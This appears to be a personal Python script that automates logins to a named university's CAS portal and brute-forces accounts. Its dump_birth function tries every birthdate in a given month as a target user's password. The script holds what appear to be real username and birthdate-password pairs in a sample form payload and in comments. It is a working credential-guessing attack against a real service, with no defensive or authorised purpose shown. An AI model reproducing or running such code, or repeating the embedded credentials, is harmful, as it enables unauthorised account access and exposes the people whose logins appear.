# -*- coding: utf-8 -*-
"""
Created on Sun Feb 19 14:06:12 2017

@author: yiyuezhuo
"""

import requests
from api import fff,parse_input,parse_headers
 
url = 'http://portal.sicnu.edu.cn:82/cas/login'
data_example = '''encodedService:http%3a%2f%2fportal.sicnu.edu.cn%2fcas.jsp
service:http://portal.sicnu.edu.cn/cas.jsp
serviceName:null
action:DCPLogin
lt:LT_M5000-R_-1025823-QXq3GxfSbcnfBAhvT9BG
username:19910008
password:19630414'''

#username = '20010092'
#password = '19640609'


def query(username, password):
    sess = requests.session()
    res = sess.get(url)
    
    inputs = parse_input(res.content, key_name='name')
    data = parse_headers(data_example)
    data['lt'] = inputs['lt']
    data['username'] = username
    data['password'] = password
    
    res2 = sess.post(url, data = data)
    try:
        html = res2.content.decode('utf8')
    except:
        html = res2.content.decode('gbk')
    
    if '错误的用户名或密码' in html:
        #print('Wrong')
        return False
    elif '访问您的应用程序' in html:
        return True
    else:
        raise Exception('Unknow content')

#print(query(username, password))
def dump_birth(username, pre_birth, verbose = True):
    # pre_birth like form '199504', the fill version like '19950413' etc
    for i in range(1, 32):
        password = pre_birth + str(i).zfill(2)
        if query(username, password):
            return password
        elif verbose:
            print('{} reject {}'.format(username, password))
    return None
'''
for i in range(1,32):
    password = '196406' + str(i).zfill(2)
    print('{}: {} is {}'.format(username, password, query(username, password)))
'''